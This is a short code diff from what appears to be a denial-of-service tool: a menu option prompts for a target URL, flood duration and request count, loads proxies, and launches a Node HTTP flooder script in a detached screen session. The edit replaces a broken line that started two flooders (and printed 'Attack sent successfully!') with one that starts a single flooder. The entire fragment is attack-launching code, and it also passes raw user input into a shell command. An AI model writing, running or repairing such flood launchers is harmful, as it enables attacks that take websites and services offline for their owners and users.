@@ -638,8 +638,7 @@ class Tool:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket1 {url} utils/http.txt {floodtime} {reqs}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['02', '2']:
